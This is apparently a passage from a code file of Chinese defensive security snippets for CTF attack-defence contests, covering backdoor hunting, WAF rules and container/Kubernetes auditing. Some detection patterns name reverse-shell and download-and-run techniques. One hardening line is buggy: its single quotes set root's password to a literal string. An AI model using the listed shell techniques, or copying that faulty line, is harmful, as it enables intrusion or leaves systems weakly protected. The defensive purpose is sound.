    desc: '快速排查后门、异常进程、定时任务',
    fix: `# === 异常进程 ===\nps aux | sort -nrk 3 | head -20\nps auxf  # 查看进程树\n\n# === 异常网络 ===\nnetstat -antlp | grep ESTAB\nss -antlp | grep ESTAB\nlsof -i -P | grep LISTEN\n\n# === 定时任务 ===\nfor u in $(cut -d: -f1 /etc/passwd); do echo "== $u =="; crontab -l -u $u 2>/dev/null; done\nls -la /etc/cron*\ncat /var/spool/cron/*\n\n# === 最近修改 ===\nfind /var/www /tmp /opt /root -mmin -60 -type f 2>/dev/null\n\n# === 登录记录 ===\nlast -n 20\nlastlog | grep -v Never\ncat /var/log/auth.log | tail -50\n\n# === 异常用户 ===\nawk -F: '$3==0{print $1}' /etc/passwd\nawk -F: '$7!~/nologin|false/{print $1,$7}' /etc/passwd\ngrep -v '^#' /etc/sudoers | grep -v '^$'`,
    oneliner: `ps aux | awk '$3>50{print}' && netstat -antlp | grep ESTAB | head -20`,
    tags: ['应急', 'emergency', 'audit', '排查', '后门'],
  },
  {
    id: 'sh-webshell', lang: 'Shell', vuln: 'WebShell查杀', title: 'WebShell一键查杀(全语言)',
    desc: '查找Web目录下所有可疑文件',
    fix: `# === PHP ===\ngrep -rn 'eval(\\|assert(\\|base64_decode(\\|gzinflate(\\|str_rot13(\\|system(\\|exec(' --include='*.php' /var/www\nfind /var/www -name '*.php' -mmin -60\n\n# === JSP ===\ngrep -rn 'Runtime.getRuntime\\|ProcessBuilder\\|getClass().forName' --include='*.jsp' /var/www\n\n# === ASP/ASPX ===\ngrep -rn 'eval(\\|Execute(\\|CreateObject' --include='*.asp' --include='*.aspx' /var/www\n\n# === Python ===\ngrep -rn 'eval(\\|exec(\\|os.system\\|subprocess' --include='*.py' /var/www\n\n# === 隐藏文件 ===\nfind /var/www -name '.*' -type f\nfind /var/www -name '*.php*' ! -name '*.php'\nfind /var/www -type f -perm /111 -name '*.php'\n\n# === 对比备份 ===\ndiff -rq /var/www /var/www.bak 2>/dev/null\n\n# === 文件完整性 ===\nfind /var/www -name '*.php' -exec md5sum {} \\; > /tmp/webfiles.md5`,
    oneliner: `find /var/www -name '*.php' -mmin -60 -exec grep -l 'eval(\\|system(\\|base64_decode(' {} \\;`,
    tags: ['webshell', '查杀', 'backdoor', 'kill'],
  },
  {
    id: 'sh-passwd', lang: 'Shell', vuln: '权限加固', title: '关键文件权限加固(比赛必做)',
    desc: '比赛中快速加固关键文件权限',
    fix: `# 锁定密码文件\nchattr +i /etc/passwd /etc/shadow /etc/group /etc/sudoers\n\n# Web目录只读(防篡改)\nchattr -R +i /var/www/html/\n\n# 限制tmp执行\nmount -o remount,noexec /tmp\nmount -o remount,noexec /dev/shm\n\n# 解锁(需要修改时)\n# chattr -i /etc/passwd`,
    oneliner: `chattr +i /etc/passwd /etc/shadow && chattr -R +i /var/www/html/`,
    tags: ['chattr', '权限', '加固', 'permission'],
  },
  {
    id: 'sh-rootkit', lang: 'Shell', vuln: 'Rootkit检测', title: 'Rootkit/后门检测',
    desc: '检测常见Rootkit和系统后门',
    fix: `# 检查系统命令是否被替换\nrpm -Va 2>/dev/null | grep '^..5' | head -20  # RPM系\ndpkg -V 2>/dev/null | head -20  # DEB系\n\n# 检查LD_PRELOAD劫持\nenv | grep LD_PRELOAD\ncat /etc/ld.so.preload\nfind / -name '*.so' -mmin -1440 2>/dev/null\n\n# 检查SSH后门\nstrings /usr/sbin/sshd | grep -i password | head -5\nmd5sum /usr/sbin/sshd\n\n# 检查PAM后门\nfind /lib/security /lib64/security -name '*.so' -mmin -1440 2>/dev/null\n\n# 检查内核模块\nlsmod | head -20\nfind /lib/modules -name '*.ko' -mmin -1440 2>/dev/null\n\n# 检查异常SUID\nfind / -perm -4000 -type f 2>/dev/null\n\n# 使用rkhunter\nrkhunter --check --skip-keypress 2>/dev/null`,
    oneliner: `env | grep LD_PRELOAD; cat /etc/ld.so.preload 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -20`,
    tags: ['rootkit', '后门', 'ld_preload', 'suid'],
  },
  {
    id: 'sh-network', lang: 'Shell', vuln: '网络排查', title: '异常网络连接排查',
    desc: '排查反弹Shell、C2通信、隧道',
    fix: `# 所有外连\nnetstat -antlp | grep ESTAB | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn\n\n# 反弹Shell特征\nlsof -i -P | grep -E ':(4444|5555|6666|7777|8888|9999)'\nss -antlp | grep -v LISTEN | awk '{print $5}' | grep -E ':(4444|5555|6666|7777|8888|9999)'\n\n# DNS隧道检测\ntcpdump -i any port 53 -nn -c 100 2>/dev/null | awk '{print $NF}' | sort | uniq -c | sort -rn | head -20\n\n# 大流量检测\niftop -t -s 10 2>/dev/null || nethogs -t -c 5 2>/dev/null\n\n# 进程网络关联\nfor pid in $(ss -antlp | grep ESTAB | awk -F'pid=' '{print $2}' | cut -d, -f1 | sort -u); do echo "PID=$pid $(cat /proc/$pid/cmdline 2>/dev/null | tr '\\0' ' ')"; done`,
    oneliner: `netstat -antlp | grep ESTAB | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -10`,
    tags: ['network', '网络', '反弹shell', 'c2', '外连'],
  },
  {
    id: 'sh-persist', lang: 'Shell', vuln: '持久化排查', title: '持久化机制排查',
    desc: '排查所有常见Linux持久化手段',
    fix: `# === crontab ===\nfor u in $(cut -d: -f1 /etc/passwd); do echo "[$u]"; crontab -l -u $u 2>/dev/null; done\ncat /etc/crontab\nls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/\n\n# === systemd服务 ===\nsystemctl list-unit-files --type=service | grep enabled\nfind /etc/systemd/system /usr/lib/systemd/system -mmin -1440 -name '*.service' 2>/dev/null\n\n# === rc.local / init.d ===\ncat /etc/rc.local 2>/dev/null\nls -la /etc/init.d/\n\n# === bashrc/profile ===\ngrep -r 'bash -i\\|/dev/tcp\\|nc -e\\|curl.*|.*sh\\|wget.*|.*sh' /home/*/.bashrc /root/.bashrc /etc/profile /etc/bash.bashrc 2>/dev/null\n\n# === SSH authorized_keys ===\nfind / -name authorized_keys -exec ls -la {} \\; -exec cat {} \\; 2>/dev/null\n\n# === .ssh/config ===\nfind /home /root -name config -path '*/.ssh/*' -exec cat {} \\; 2>/dev/null`,
    oneliner: `find /etc/systemd/system -mmin -1440 -name '*.service' 2>/dev/null; for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u 2>/dev/null | grep -v '^#'; done`,
    tags: ['persist', '持久化', 'cron', 'systemd', 'bashrc', 'authorized_keys'],
  },
  {
    id: 'sh-docker', lang: 'Shell', vuln: 'Docker加固', title: 'Docker容器安全加固',
    desc: 'Docker逃逸防护和容器加固',
    fix: `# 检查特权容器\ndocker ps --format '{{.Names}}' | xargs -I{} docker inspect {} --format='{{.Name}} privileged={{.HostConfig.Privileged}}'\n\n# 检查挂载了宿主机目录的容器\ndocker ps -q | xargs docker inspect --format='{{.Name}} {{range .Mounts}}{{.Source}}->{{.Destination}} {{end}}' | grep -v '/var/lib/docker'\n\n# 限制容器能力\n# docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE ...\n\n# 只读文件系统\n# docker run --read-only ...\n\n# 限制资源\n# docker run --memory=512m --cpus=1 ...\n\n# 检查Docker API暴露\nss -antlp | grep 2375\ncurl -s http://localhost:2375/version 2>/dev/null`,
    oneliner: `docker ps --format '{{.Names}}' | xargs -I{} docker inspect {} --format='{{.Name}} priv={{.HostConfig.Privileged}}'`,
    tags: ['docker', '容器', '逃逸', '加固'],
  },
  {
    id: 'sh-log', lang: 'Shell', vuln: '日志分析', title: '安全日志快速分析',
    desc: '分析auth/access/syslog关键日志',
    fix: `# === SSH暴力破解 ===\ngrep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10\ngrep 'Accepted' /var/log/auth.log | tail -20\n\n# === Web攻击 ===\nawk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -20  # Top IP\ngrep -iE 'union|select|eval|exec|/etc/passwd|\\.\\./|<script' /var/log/nginx/access.log | tail -50  # 攻击特征\nawk '$9>=400{print $1,$7,$9}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -20  # 异常状态码\n\n# === 提权检测 ===\ngrep -iE 'sudo|su -|su root' /var/log/auth.log | tail -20\n\n# === 系统异常 ===\ndmesg | grep -iE 'error|fail|oom|killed' | tail -20\njournalctl -p err --since '1 hour ago' 2>/dev/null | tail -30`,
    oneliner: `grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10`,
    tags: ['log', '日志', '分析', 'auth', 'access'],
  },
  {
    id: 'sh-baseline', lang: 'Shell', vuln: '基线加固', title: '比赛开局加固Checklist',
    desc: '比赛开始后前5分钟必做项',
    fix: `# 1. 修改所有默认密码\necho 'root:$(openssl rand -base64 16)' | chpasswd\npasswd  # 交互式改密码\n\n# 2. 备份Web目录\ncp -a /var/www /var/www.bak\ntar czf /tmp/web_backup_$(date +%s).tar.gz /var/www\n\n# 3. 锁定关键文件\nchattr +i /etc/passwd /etc/shadow\nchattr -R +i /var/www/html/\n\n# 4. 禁用危险PHP函数\necho 'disable_functions=system,exec,passthru,shell_exec,popen,proc_open,eval,assert' >> /etc/php.ini\nsystemctl restart php-fpm 2>/dev/null\n\n# 5. 防火墙(只开比赛端口)\niptables -P INPUT DROP\niptables -A INPUT -i lo -j ACCEPT\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -p tcp -m multiport --dports 22,80,443 -j ACCEPT\n\n# 6. 检查异常用户和SUID\nawk -F: '$3==0&&$1!="root"{print}' /etc/passwd\nfind / -perm -4000 -type f 2>/dev/null\n\n# 7. 开启审计日志\nservice auditd start 2>/dev/null\nauditctl -w /etc/passwd -p wa -k passwd_changes\nauditctl -w /var/www -p wa -k web_changes`,
    oneliner: `cp -a /var/www /var/www.bak && chattr +i /etc/passwd /etc/shadow && iptables -P INPUT DROP && iptables -A INPUT -i lo -j ACCEPT && iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT && iptables -A INPUT -p tcp -m multiport --dports 22,80,443 -j ACCEPT`,
    tags: ['baseline', '加固', '基线', 'checklist', '比赛', '开局'],
  },
  {
    id: 'sh-waf-nginx', lang: 'Shell', vuln: 'WAF', title: 'Nginx简易WAF(比赛邪修)',
    desc: 'Nginx层面快速过滤常见攻击',
    fix: `# 在 nginx server{} 块中添加:\n\n# 封禁常见攻击路径\nlocation ~* \\.(bak|sql|tar|gz|zip|log|swp|old|conf)$ {\n    return 403;\n}\n\n# SQL注入过滤\nif ($query_string ~* "union.*select|select.*from|insert.*into|delete.*from|drop.*table|update.*set") {\n    return 403;\n}\n\n# 文件包含过滤\nif ($query_string ~* "\\.\\./|\\.\\.\\\\\\\\|etc/passwd|proc/self") {\n    return 403;\n}\n\n# XSS过滤\nif ($query_string ~* "<script|javascript:|onerror=|onload=") {\n    return 403;\n}\n\n# 命令注入过滤\nif ($query_string ~* ";|\\||\\$\\(|\\x60|%0a|%0d") {\n    return 403;\n}\n\n# 限流\nlimit_req_zone $binary_remote_addr zone=req:10m rate=30r/s;\nserver {\n    limit_req zone=req burst=50 nodelay;\n}`,
    oneliner: `# 快速添加到nginx配置: 注意需要在http或server块内\nnginx -t && systemctl reload nginx`,
    tags: ['waf', 'nginx', '过滤', '邪修', '比赛'],
  },
  {
    id: 'sh-waf-apache', lang: 'Shell', vuln: 'WAF', title: 'Apache mod_rewrite WAF',
    desc: 'Apache .htaccess 快速防御',
    fix: `# .htaccess 添加:\nRewriteEngine On\n\n# SQL注入\nRewriteCond %{QUERY_STRING} union.*select [NC,OR]\nRewriteCond %{QUERY_STRING} select.*from [NC,OR]\nRewriteCond %{QUERY_STRING} insert.*into [NC,OR]\nRewriteCond %{QUERY_STRING} drop.*table [NC,OR]\n\n# 文件包含\nRewriteCond %{QUERY_STRING} \\.\\.\\/\\.\\. [NC,OR]\nRewriteCond %{QUERY_STRING} etc\\/passwd [NC,OR]\n\n# 命令注入\nRewriteCond %{QUERY_STRING} ;.*\\/ [NC,OR]\nRewriteCond %{QUERY_STRING} \\$\\( [NC,OR]\n\n# XSS\nRewriteCond %{QUERY_STRING} <script [NC]\nRewriteRule .* - [F,L]`,
    oneliner: `echo 'RewriteEngine On' >> /var/www/.htaccess`,
    tags: ['waf', 'apache', 'htaccess', '过滤'],
  },
  {
    id: 'sh-traffic', lang: 'Shell', vuln: '流量分析', title: '比赛流量抓包分析',
    desc: '快速抓包和分析攻击流量',
    fix: `# 抓取HTTP流量\ntcpdump -i any port 80 -A -s 0 -c 1000 -w /tmp/traffic.pcap\n\n# 实时查看HTTP请求\ntcpdump -i any port 80 -A | grep -E 'GET |POST |Host:'\n\n# 分析攻击IP\ntcpdump -nr /tmp/traffic.pcap | awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c | sort -rn | head\n\n# 搜索攻击Payload\nstrings /tmp/traffic.pcap | grep -iE 'union|select|eval|exec|passwd|flag|cmd'\n\n# 用tshark分析\ntshark -r /tmp/traffic.pcap -T fields -e ip.src -e http.request.uri 2>/dev/null | sort | uniq -c | sort -rn | head`,
    oneliner: `tcpdump -i any port 80 -A -c 200 2>/dev/null | grep -iE 'union|select|eval|exec|flag'`,
    tags: ['traffic', 'tcpdump', 'pcap', '抓包', '流量'],
  },
  {
    id: 'sh-flag', lang: 'Shell', vuln: '比赛技巧', title: 'Flag防护/监控',
    desc: '监控flag文件，防止被读取或篡改',
    fix: `# 找到flag文件\nfind / -name 'flag*' -o -name '*flag*' 2>/dev/null\n\n# 监控flag文件读取\nauditctl -w /flag -p r -k flag_read\nauditctl -w /root/flag.txt -p rwa -k flag_access\n\n# 实时监控文件访问\ninotifywait -m /flag 2>/dev/null &\n\n# 定期检查flag完整性\nwhile true; do\n  md5=$(md5sum /flag 2>/dev/null | awk '{print $1}')\n  if [ "$md5" != "ORIGINAL_MD5" ]; then\n    echo "FLAG CHANGED at $(date)" >> /tmp/flag_alert.log\n    # 恢复flag\n    echo 'original_flag_content' > /flag\n  fi\n  sleep 5\ndone &`,
    oneliner: `md5sum /flag* /root/flag* 2>/dev/null && auditctl -w /flag -p rwa -k flag 2>/dev/null`,
    tags: ['flag', '比赛', 'ctf', '监控', '防护'],
  },
];

// ═══════════════════════════════════════
// SQL / 数据库
// ═══════════════════════════════════════
const sql: SecFixSnippet[] = [
  {
    id: 'sql-mysql', lang: 'SQL', vuln: 'MySQL加固', title: 'MySQL安全加固',
    desc: '删除匿名用户、限制远程root',
    fix: `DELETE FROM mysql.user WHERE User='';\nDELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost','127.0.0.1','::1');\nDROP DATABASE IF EXISTS test;\nALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongP@ss!';\nFLUSH PRIVILEGES;`,
    oneliner: `mysql -uroot -e "DELETE FROM mysql.user WHERE User=''; FLUSH PRIVILEGES;"`,
    tags: ['mysql', '加固'],
  },
  {
    id: 'sql-mysql-log', lang: 'SQL', vuln: 'MySQL审计', title: 'MySQL开启审计日志',
    desc: '开启通用日志和慢查询日志',
    fix: `-- 开启通用查询日志(记录所有SQL)\nSET GLOBAL general_log = 'ON';\nSET GLOBAL general_log_file = '/var/log/mysql/general.log';\n\n-- 开启慢查询日志\nSET GLOBAL slow_query_log = 'ON';\nSET GLOBAL long_query_time = 2;\n\n-- 查看当前连接\nSHOW PROCESSLIST;\n\n-- 查看用户权限\nSELECT user,host,authentication_string FROM mysql.user;`,
    oneliner: `mysql -uroot -e "SET GLOBAL general_log='ON'; SHOW PROCESSLIST;"`,
    tags: ['mysql', 'audit', '审计', '日志'],
  },
  {
    id: 'sql-redis', lang: 'SQL', vuln: 'Redis加固', title: 'Redis安全加固',
    desc: 'Redis未授权访问防护',
    fix: `# redis.conf\nbind 127.0.0.1\nprotected-mode yes\nrequirepass YourStrongPassword\nrename-command FLUSHDB ""\nrename-command FLUSHALL ""\nrename-command CONFIG ""\nrename-command KEYS ""\nrename-command DEBUG ""\nrename-command EVAL ""`,
    oneliner: `redis-cli CONFIG SET requirepass 'YourStrongPassword' && redis-cli -a YourStrongPassword CONFIG SET protected-mode yes`,
    tags: ['redis', '加固', '未授权'],
  },
  {
    id: 'sql-pg', lang: 'SQL', vuln: 'PostgreSQL加固', title: 'PostgreSQL安全加固',
    desc: 'PostgreSQL访问控制和权限加固',
    fix: `-- 修改默认密码\nALTER USER postgres PASSWORD 'StrongP@ss!';\n\n-- pg_hba.conf (限制访问)\n# local  all  all  md5\n# host   all  all  127.0.0.1/32  md5\n# 禁止远程trust认证\n\n-- 关闭不需要的扩展\nDROP EXTENSION IF EXISTS dblink;\nDROP EXTENSION IF EXISTS pg_execute_external_program;\n\n-- 检查权限\nSELECT usename, usecreatedb, usesuper FROM pg_user;`,
    oneliner: `psql -U postgres -c "ALTER USER postgres PASSWORD 'StrongP@ss!';"`,
    tags: ['postgresql', 'pg', '加固'],
  },
];

// ═══════════════════════════════════════
// K8s / Docker 容器安全
// ═══════════════════════════════════════
const k8s_docker: SecFixSnippet[] = [
  // ---- Docker 排查 ----
  {
    id: 'k8s-docker-escape', lang: 'K8s/容器', vuln: 'Docker逃逸排查', title: 'Docker逃逸风险排查',
    desc: '检测特权容器、危险挂载、暴露API',
    fix: `# === 特权容器检测 ===
docker ps --format '{{.Names}}' | xargs -I{} docker inspect {} \\
  --format='{{.Name}} privileged={{.HostConfig.Privileged}} pid={{.HostConfig.PidMode}}'

# === 危险挂载检测 ===
docker ps -q | xargs docker inspect \\
  --format='{{.Name}} {{range .Mounts}}{{.Source}}->{{.Destination}} {{end}}' \\
  | grep -E 'docker.sock|/etc/shadow|/etc/passwd|/root|/proc|/sys'

# === Docker API暴露 ===
ss -antlp | grep -E '2375|2376'
curl -s http://localhost:2375/version 2>/dev/null && echo "[CRITICAL] Docker API暴露!"

# === 容器网络模式 ===
docker ps -q | xargs docker inspect --format='{{.Name}} NetworkMode={{.HostConfig.NetworkMode}}' | grep host

# === 危险capabilities ===
docker ps -q | xargs docker inspect --format='{{.Name}} CapAdd={{.HostConfig.CapAdd}}'`,
    oneliner: `docker ps --format '{{.Names}}' | xargs -I{} docker inspect {} --format='{{.Name}} priv={{.HostConfig.Privileged}} caps={{.HostConfig.CapAdd}}'`,
    tags: ['docker', '逃逸', 'escape', '特权', 'privileged', 'socket'],
  },
  {
    id: 'k8s-docker-forensic', lang: 'K8s/容器', vuln: 'Docker取证', title: 'Docker容器取证排查',
    desc: '容器内进程、网络、文件取证',
    fix: `# === 容器内进程 ===
docker exec CONTAINER_NAME ps auxf
docker top CONTAINER_NAME

# === 容器内网络连接 ===
docker exec CONTAINER_NAME ss -antlp 2>/dev/null || \\
  docker exec CONTAINER_NAME netstat -antlp

# === 容器内文件变更(对比镜像) ===
docker diff CONTAINER_NAME

# === 导出容器文件系统 ===
docker export CONTAINER_NAME > /tmp/container_fs.tar
# 分析: tar xf /tmp/container_fs.tar -C /tmp/analyze/

# === 查看容器日志 ===
docker logs --tail 200 CONTAINER_NAME

# === 查看容器历史命令 ===
docker exec CONTAINER_NAME cat /root/.bash_history 2>/dev/null
docker exec CONTAINER_NAME cat /home/*/.bash_history 2>/dev/null

# === 检查容器环境变量(可能有密码) ===
docker exec CONTAINER_NAME env | grep -iE 'pass|secret|key|token'`,
    oneliner: `docker diff CONTAINER_NAME | head -30 && docker exec CONTAINER_NAME ss -antlp 2>/dev/null | head -20`,
    tags: ['docker', '取证', 'forensic', '排查', 'diff'],
  },
  {
    id: 'k8s-docker-harden', lang: 'K8s/容器', vuln: 'Docker加固', title: 'Docker安全加固配置',
    desc: 'Docker daemon和容器运行时加固',
    fix: `# === daemon.json 加固 (/etc/docker/daemon.json) ===
{
  "icc": false,
  "no-new-privileges": true,
  "userns-remap": "default",
  "log-driver": "json-file",
  "log-opts": { "max-size": "10m", "max-file": "3" },
  "live-restore": true,
  "userland-proxy": false
}

# === 安全运行容器 ===
docker run \\
  --cap-drop=ALL \\
  --cap-add=NET_BIND_SERVICE \\
  --security-opt=no-new-privileges:true \\
  --read-only \\
  --tmpfs /tmp \\
  --memory=512m --cpus=1 \\
  --pids-limit=100 \\
  --network=custom_bridge \\
  IMAGE_NAME

# === 禁用Docker远程API ===
# /etc/docker/daemon.json 中不要配置 "hosts": ["tcp://0.0.0.0:2375"]
# 如果必须远程, 使用TLS:
# dockerd --tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=server-key.pem`,
    oneliner: `cat /etc/docker/daemon.json 2>/dev/null; ss -antlp | grep -E '2375|2376'`,
    tags: ['docker', '加固', 'daemon', 'harden', '安全配置'],
  },
  // ---- K8s 排查 ----
  {
    id: 'k8s-pod-audit', lang: 'K8s/容器', vuln: 'K8s威胁排查', title: 'K8s恶意Pod快速排查',
    desc: '排查特权Pod、反弹Shell、异常挂载',
    fix: `# === 特权Pod ===
kubectl get pods -A -o json | jq -r '
  .items[] | select(.spec.containers[].securityContext.privileged==true) |
  "\\(.metadata.namespace)/\\(.metadata.name)"'

# === 反弹Shell Pod ===
kubectl get pods -A -o json | jq -r '
  .items[] |
  .metadata as $m |
  .spec.containers[] |
  select((.command // []) + (.args // []) | join(" ") | test("/dev/tcp|bash -i|nc -e|ncat")) |
  "\\($m.namespace)/\\($m.name) cmd=\\((.command // []) + (.args // []) | join(" "))"'

# === hostPID / hostIPC / hostNetwork ===
kubectl get pods -A -o json | jq -r '
  .items[] | select(.spec.hostPID==true or .spec.hostIPC==true or .spec.hostNetwork==true) |
  "\\(.metadata.namespace)/\\(.metadata.name) hostPID=\\(.spec.hostPID) hostIPC=\\(.spec.hostIPC) hostNet=\\(.spec.hostNetwork)"'

# === 危险挂载(docker.sock/宿主机根目录) ===
kubectl get pods -A -o json | jq -r '
  .items[] |
  .metadata as $m |
  .spec.volumes[]? | select(.hostPath.path | test("/var/run/docker|/etc/shadow|^/$")) |
  "\\($m.namespace)/\\($m.name) mount=\\(.hostPath.path)"'

# === 查看Pod启动命令 ===
kubectl get pods -A -o json | jq -r '
  .items[] | select(.metadata.namespace != "kube-system") |
  .metadata as $m |
  .spec.containers[] | select(.command != null) |
  "\\($m.namespace)/\\($m.name) \\(.command | join(" ")) \\(.args // [] | join(" "))"'`,
    oneliner: `kubectl get pods -A -o json | jq -r '.items[]|select(.spec.containers[].securityContext.privileged==true)|"\\(.metadata.namespace)/\\(.metadata.name)"'`,
    tags: ['k8s', 'pod', '特权', '反弹shell', 'hostpath', '排查'],
  },
  {
    id: 'k8s-rbac-audit', lang: 'K8s/容器', vuln: 'K8s威胁排查', title: 'K8s RBAC/SA权限排查',
    desc: '排查高权限ServiceAccount、异常ClusterRoleBinding',
    fix: `# === cluster-admin 绑定(非系统) ===
kubectl get clusterrolebindings -o json | jq -r '
  .items[] | select(.roleRef.name=="cluster-admin") |
  .subjects[]? | select(.name | startswith("system:") | not) |
  "\\(.kind)/\\(.name) ns=\\(.namespace // "cluster")"'

# === 通配符权限的ClusterRole ===
kubectl get clusterroles -o json | jq -r '
  .items[] | select(.metadata.name | startswith("system:") | not) |
  select(.rules[]? | (.verbs | index("*")) and (.resources | index("*"))) |
  .metadata.name'

# === 非默认ServiceAccount ===
kubectl get sa -A | grep -v default | grep -v kube-system

# === SA绑定了什么角色 ===
SA_NAME="thinking"; NS="mail"
kubectl get rolebindings,clusterrolebindings -A -o json | jq -r "
  .items[] | select(.subjects[]? | .name==\\"$SA_NAME\\" and .kind==\\"ServiceAccount\\") |
  \\"\\(.metadata.name) -> \\(.roleRef.name)\\""

# === 谁能 exec 进Pod ===
kubectl get clusterroles -o json | jq -r '
  .items[] | select(.rules[]? | (.resources | index("pods/exec")) and (.verbs | index("create"))) |
  .metadata.name'

# === 删除可疑SA及绑定 ===
kubectl delete sa SUSPICIOUS_SA -n TARGET_NS
kubectl delete rolebinding BINDING_NAME -n TARGET_NS
kubectl delete clusterrolebinding BINDING_NAME`,
    oneliner: `kubectl get clusterrolebindings -o json | jq -r '.items[]|select(.roleRef.name=="cluster-admin")|.subjects[]?|select(.name|startswith("system:")|not)|"\\(.kind)/\\(.name)"'`,
    tags: ['k8s', 'rbac', 'sa', 'serviceaccount', 'cluster-admin', '权限', '提权'],
  },
  {
    id: 'k8s-cronjob-audit', lang: 'K8s/容器', vuln: 'K8s威胁排查', title: 'K8s CronJob/Job恶意任务排查',
    desc: '排查恶意定时任务、异常Job',
    fix: `# === 列出所有CronJob及命令 ===
kubectl get cronjobs -A -o json | jq -r '
  .items[] |
  .metadata as $m |
  .spec.jobTemplate.spec.template.spec.containers[] |
  "\\($m.namespace)/\\($m.name) schedule=\\($m | .annotations // {} | to_entries | .[0].value // "N/A") cmd=\\((.command // []) + (.args // []) | join(" "))"'

# === 查看CronJob schedule ===
kubectl get cronjobs -A -o wide

# === 暂停可疑CronJob ===
kubectl patch cronjob CRONJOB_NAME -n NAMESPACE -p '{"spec":{"suspend":true}}'

# === 删除CronJob及其Job和Pod ===
kubectl delete cronjob CRONJOB_NAME -n NAMESPACE
kubectl delete jobs -n NAMESPACE -l job-name=CRONJOB_NAME

# === 查看正在运行的Job ===
kubectl get jobs -A | grep -v Completed`,
    oneliner: `kubectl get cronjobs -A -o wide && kubectl get jobs -A | grep -v Completed`,
    tags: ['k8s', 'cronjob', 'job', '定时任务', '持久化'],
  },
  {
    id: 'k8s-persistence', lang: 'K8s/容器', vuln: 'K8s持久化排查', title: 'K8s持久化机制全面排查',
    desc: '排查静态Pod、DaemonSet、etcd篡改等持久化手法',
    fix: `# === 静态Pod检测(控制面节点) ===
ls -la /etc/kubernetes/manifests/
# minikube环境:
docker exec minikube ls /etc/kubernetes/manifests/

# === 非系统DaemonSet ===
kubectl get daemonsets -A | grep -v kube-system

# === 异常Admission Webhook ===
kubectl get mutatingwebhookconfigurations
kubectl get validatingwebhookconfigurations

# === etcd Pod键名校验(检测篡改) ===
# 需要在控制面节点执行:
ETCDCTL_API=3 etcdctl \\
  --endpoints=https://127.0.0.1:2379 \\
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \\
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \\
  get /registry/pods/ --prefix --keys-only

# === etcd直接删除篡改的Pod ===
ETCDCTL_API=3 etcdctl \\
  --endpoints=https://127.0.0.1:2379 \\
  --cacert=... --cert=... --key=... \\
  del /registry/pods/NAMESPACE/TAMPERED_KEY_NAME

# === 节点systemd持久化 ===
systemctl list-unit-files --type=service --state=enabled | \\
  grep -vE 'snap|systemd|docker|containerd|ssh|cron|rsyslog'

# === 节点crontab ===
crontab -l 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.d/`,
    oneliner: `ls /etc/kubernetes/manifests/ 2>/dev/null; kubectl get daemonsets -A | grep -v kube-system; kubectl get mutatingwebhookconfigurations 2>/dev/null`,
    tags: ['k8s', '持久化', 'static pod', 'daemonset', 'etcd', 'webhook', 'persistence'],
  },
  {
    id: 'k8s-forensic-timeline', lang: 'K8s/容器', vuln: 'K8s取证', title: 'K8s集群取证时间线',
    desc: '按时间排序所有资源创建记录，重建攻击时间线',
    fix: `# === 所有非系统Pod按创建时间排序 ===
kubectl get pods -A --sort-by=.metadata.creationTimestamp -o custom-columns=\\
'NS:.metadata.namespace,NAME:.metadata.name,CREATED:.metadata.creationTimestamp,SA:.spec.serviceAccountName,NODE:.spec.nodeName' \\
  | grep -v kube-system

# === 所有ClusterRoleBinding按时间排序 ===
kubectl get clusterrolebindings --sort-by=.metadata.creationTimestamp -o custom-columns=\\
'NAME:.metadata.name,CREATED:.metadata.creationTimestamp,ROLE:.roleRef.name' \\
  | grep -v system

# === 所有ServiceAccount按时间排序 ===
kubectl get sa -A --sort-by=.metadata.creationTimestamp -o custom-columns=\\
'NS:.metadata.namespace,NAME:.metadata.name,CREATED:.metadata.creationTimestamp' \\
  | grep -v kube-system | grep -v default

# === Warning事件(最近1小时) ===
kubectl get events -A --sort-by=.lastTimestamp --field-selector type=Warning | tail -30

# === API审计日志(如果开启) ===
find /var/log/kubernetes/audit* -name '*.log' 2>/dev/null | head -5
# 分析: cat /var/log/kubernetes/audit/audit.log | jq 'select(.user.username != "system:serviceaccount:kube-system:*")' | head`,
    oneliner: `kubectl get pods -A --sort-by=.metadata.creationTimestamp | grep -v kube-system | tail -20`,
    tags: ['k8s', '取证', 'forensic', 'timeline', '时间线', '排查'],
  },
  {
    id: 'k8s-network-audit', lang: 'K8s/容器', vuln: 'K8s网络安全', title: 'K8s网络安全排查',
    desc: '排查NetworkPolicy缺失、Service暴露、Pod网络连接',
    fix: `# === 无NetworkPolicy的命名空间 ===
comm -23 \\
  <(kubectl get ns -o jsonpath='{range .items[*]}{.metadata.name}{"\\n"}{end}' | sort) \\
  <(kubectl get netpol -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"\\n"}{end}' | sort -u)

# === NodePort/LoadBalancer服务 ===
kubectl get svc -A | grep -E 'NodePort|LoadBalancer'

# === Pod外连检测 ===
kubectl exec POD_NAME -n NS -- ss -tnp 2>/dev/null || \\
  kubectl exec POD_NAME -n NS -- netstat -tnp 2>/dev/null

# === 一键隔离命名空间(deny-all) ===
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
  namespace: TARGET_NS
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
EOF

# === 隔离单个Pod ===
POD_LABELS=$(kubectl get pod POD_NAME -n NS -o jsonpath='{.metadata.labels}' | jq -r 'to_entries|.[]|"\\(.key): \\(.value)"')
